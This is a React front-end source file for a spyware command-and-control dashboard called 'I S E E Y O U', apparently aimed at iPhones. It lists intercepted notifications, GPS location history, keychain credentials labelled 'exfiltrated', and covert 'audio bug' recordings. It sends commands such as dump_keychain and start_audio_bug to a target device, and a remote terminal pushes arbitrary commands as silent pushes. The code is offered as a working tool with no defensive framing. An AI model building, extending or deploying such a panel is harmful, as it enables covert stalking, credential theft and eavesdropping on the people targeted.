import React, { useState, useEffect } from 'react';
import './index.css';

const API_BASE = 'http://localhost:3000';

function App() {
  const [data, setData] = useState({
    locations: [],
    notifications: [],
    credentials: [],
    logs: [],
    audioFiles: []
  });
  const [currentView, setCurrentView] = useState('overview');
  const [command, setCommand] = useState('get_gps');
  const [deviceId, setDeviceId] = useState('00008120-001959081A63601E');
  const [statusMessage, setStatusMessage] = useState('');

  const refreshData = async () => {
    try {
      const response = await fetch(`${API_BASE}/api/data`);
      const json = await response.json();
      setData(json);
    } catch (err) {
      console.error('Failed to fetch data', err);
    }
  };

  useEffect(() => {
    refreshData();
    const interval = setInterval(refreshData, 5000);
    return () => clearInterval(interval);
  }, []);

  const sendCommand = async () => {
    setStatusMessage('Sending...');
    try {
      const resp = await fetch(`${API_BASE}/command/${deviceId}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: command })
      });
      const result = await resp.json();
      setStatusMessage(result.message);
      setTimeout(() => setStatusMessage(''), 3000);
    } catch (err) {
      setStatusMessage('Error sending command');
    }
  };

  const renderContent = () => {
    switch (currentView) {
      case 'overview':
        return (
          <div className="view-fade">
            <h1 className="accent-text mb-4">Command Center Overview</h1>
            <div className="grid" style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(250px, 1fr))', gap: '1.5rem' }}>
              <div className="glass-card">
                <h3>Active Target</h3>
                <p className="mono mt-2" style={{ color: 'var(--accent-color)' }}>{deviceId}</p>
                <div className="mt-2"><span className="status-indicator status-online"></span> <span className="text-secondary">Connected</span></div>
              </div>
              <div className="glass-card">
                <h3>Notifications</h3>
                <p className="text-secondary mt-2">Captured: <span className="accent-text">{data.notifications.length}</span></p>
              </div>
              <div className="glass-card">
                <h3>Audio Logs</h3>
                <p className="text-secondary mt-2">Captured: <span className="accent-text">{data.audioFiles.length}</span></p>
              </div>
            </div>

            <div className="glass-card mt-4">
              <h2>Quick Actions</h2>
              <div style={{ display: 'flex', gap: '1rem', marginTop: '1rem' }}>
                <button onClick={() => { setCommand('get_gps'); sendCommand(); }}>Ping GPS</button>
                <button onClick={() => { setCommand('start_audio_bug'); sendCommand(); }}>Start Audio Bug</button>
                <button onClick={() => { setCommand('dump_keychain'); sendCommand(); }}>Sync Keychain</button>
              </div>
            </div>
          </div>
        );
      case 'notifications':
        return (
          <div className="view-fade">
            <h1 className="accent-text mb-4">Intercepted Notifications</h1>
            <div className="glass-card table-container">
              <table>
                <thead>
                  <tr>
                    <th>Timestamp</th>
                    <th>App/Source</th>
                    <th>Content</th>
                  </tr>
                </thead>
                <tbody>
                  {data.notifications.map((n, i) => (
                    <tr key={i}>
                      <td className="mono text-secondary">{new Date(n.timestamp).toLocaleString()}</td>
                      <td className="accent-text">{n.title || 'System'}</td>
                      <td>{n.body}</td>
                    </tr>
                  ))}
                  {data.notifications.length === 0 && <tr><td colSpan="3" style={{ textAlign: 'center' }}>No notifications captured yet.</td></tr>}
                </tbody>
              </table>
            </div>
          </div>
        );
      case 'locations':
        return (
          <div className="view-fade">
            <h1 className="accent-text mb-4">Location History</h1>
            <div className="glass-card">
              <p className="text-secondary">Real-time map tracking (Integration Pending)</p>
              <table className="mt-4">
                <thead>
                  <tr>
                    <th>Time</th>
                    <th>Coordinates</th>
                    <th>Accuracy</th>
                  </tr>
                </thead>
                <tbody>
                  {data.locations.map((l, i) => (
                    <tr key={i}>
                      <td className="mono text-secondary">{new Date(l.timestamp).toLocaleString()}</td>
                      <td className="accent-text">{l.latitude.toFixed(6)}, {l.longitude.toFixed(6)}</td>
                      <td>{l.accuracy?.toFixed(1)}m</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        );
      case 'keychain':
        return (
          <div className="view-fade">
            <h1 className="accent-text mb-4">Exfiltrated Credentials</h1>
            <div className="glass-card table-container">
              <table>
                <thead>
                  <tr>
                    <th>Service / Account</th>
                    <th>Credentials Found</th>
                  </tr>
                </thead>
                <tbody>
                  {data.credentials.map((c, i) => (
                    <tr key={i}>
                      <td className="accent-text">{c.acct || 'Unknown'}</td>
                      <td className="mono">{JSON.stringify(c)}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        );
      case 'terminal':
        return (
          <div className="view-fade">
            <h1 className="accent-text mb-4">Remote Terminal</h1>
            <div className="glass-card">
              <div className="mono" style={{ background: '#000', padding: '1rem', borderRadius: '8px', minHeight: '200px', border: '1px solid var(--accent-color)' }}>
                <p className="text-secondary">$ ready to send silent pushes...</p>
                {statusMessage && <p className="accent-text mt-2">{statusMessage}</p>}
              </div>
              <div className="mt-4" style={{ display: 'flex', gap: '1rem' }}>
                <input
                  className="glass-card"
                  style={{ flex: 1, margin: 0, padding: '0.8rem', background: 'rgba(255,255,255,0.05)' }}
                  value={command}
                  onChange={(e) => setCommand(e.target.value)}
                  placeholder="Enter command (e.g. heartbeat, get_gps...)"
                />
                <button onClick={sendCommand}>Execute</button>
              </div>
            </div>
          </div>
        );
      case 'audio':
        return (
          <div className="view-fade">
            <h1 className="accent-text mb-4">Audio Bug Recordings</h1>
            <div className="glass-card">
              <div className="table-container">
                <table>
                  <thead>
                    <tr>
                      <th>Time</th>
                      <th>Filename</th>
                      <th>Action</th>
                    </tr>
                  </thead>
                  <tbody>
                    {data.audioFiles.map((a, i) => (
                      <tr key={i}>
                        <td className="mono text-secondary">{new Date(a.timestamp).toLocaleString()}</td>
                        <td className="accent-text">{a.fileName}</td>
                        <td>
                          <button style={{ padding: '0.4rem 1rem' }}>Play (Stub)</button>
                        </td>
                      </tr>
                    ))}
                    {data.audioFiles.length === 0 && <tr><td colSpan="3" style={{ textAlign: 'center' }}>No audio recordings exfiltrated yet.</td></tr>}
                  </tbody>
                </table>
              </div>
            </div>
          </div>
        );
      default:
        return <h1>View Not Found</h1>;
    }
  };

  return (
    <>
      <div className="sidebar">
        <h2 className="accent-text mb-8">I S E E Y O U</h2>
        <nav style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
          <div onClick={() => setCurrentView('overview')} className={`nav-item ${currentView === 'overview' ? 'active' : ''}`} style={navStyle}>Overview</div>
          <div onClick={() => setCurrentView('notifications')} className={`nav-item ${currentView === 'notifications' ? 'active' : ''}`} style={navStyle}>Notifications</div>
          <div onClick={() => setCurrentView('locations')} className={`nav-item ${currentView === 'locations' ? 'active' : ''}`} style={navStyle}>Maps & GPS</div>
          <div onClick={() => setCurrentView('keychain')} className={`nav-item ${currentView === 'keychain' ? 'active' : ''}`} style={navStyle}>Keychain</div>
          <div onClick={() => setCurrentView('audio')} className={`nav-item ${currentView === 'audio' ? 'active' : ''}`} style={navStyle}>Audio Bug</div>
          <div onClick={() => setCurrentView('terminal')} className={`nav-item ${currentView === 'terminal' ? 'active' : ''}`} style={navStyle}>Terminal</div>
        </nav>
        <div style={{ marginTop: 'auto', paddingTop: '2rem' }}>
          <div className="text-secondary mono" style={{ fontSize: '0.8rem' }}>AGENT VERSION: 1.0.4-BETA</div>
        </div>
      </div>

      <main className="main-content">
        {renderContent()}
      </main>

      <style>{`
        .nav-item {
          padding: 0.8rem 1rem;
          border-radius: 8px;
          cursor: pointer;
          color: var(--text-secondary);
          transition: var(--transition);
        }
        .nav-item:hover {
          background: rgba(255,255,255,0.05);
          color: var(--text-primary);
        }
        .nav-item.active {
          background: rgba(0, 242, 255, 0.1);
          color: var(--accent-color);
          border-left: 3px solid var(--accent-color);
        }
        .mb-4 { margin-bottom: 1rem; }
        .mb-8 { margin-bottom: 2rem; }
        .mt-2 { margin-top: 0.5rem; }
        .mt-4 { margin-top: 1rem; }
        .view-fade {
          animation: fadeIn 0.5s ease-out;
        }
        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(10px); }
          to { opacity: 1; transform: translateY(0); }
        }
      `}</style>
    </>
  );
}

const navStyle = {
  fontSize: '0.95rem',
  fontWeight: '500'
};

export default App;
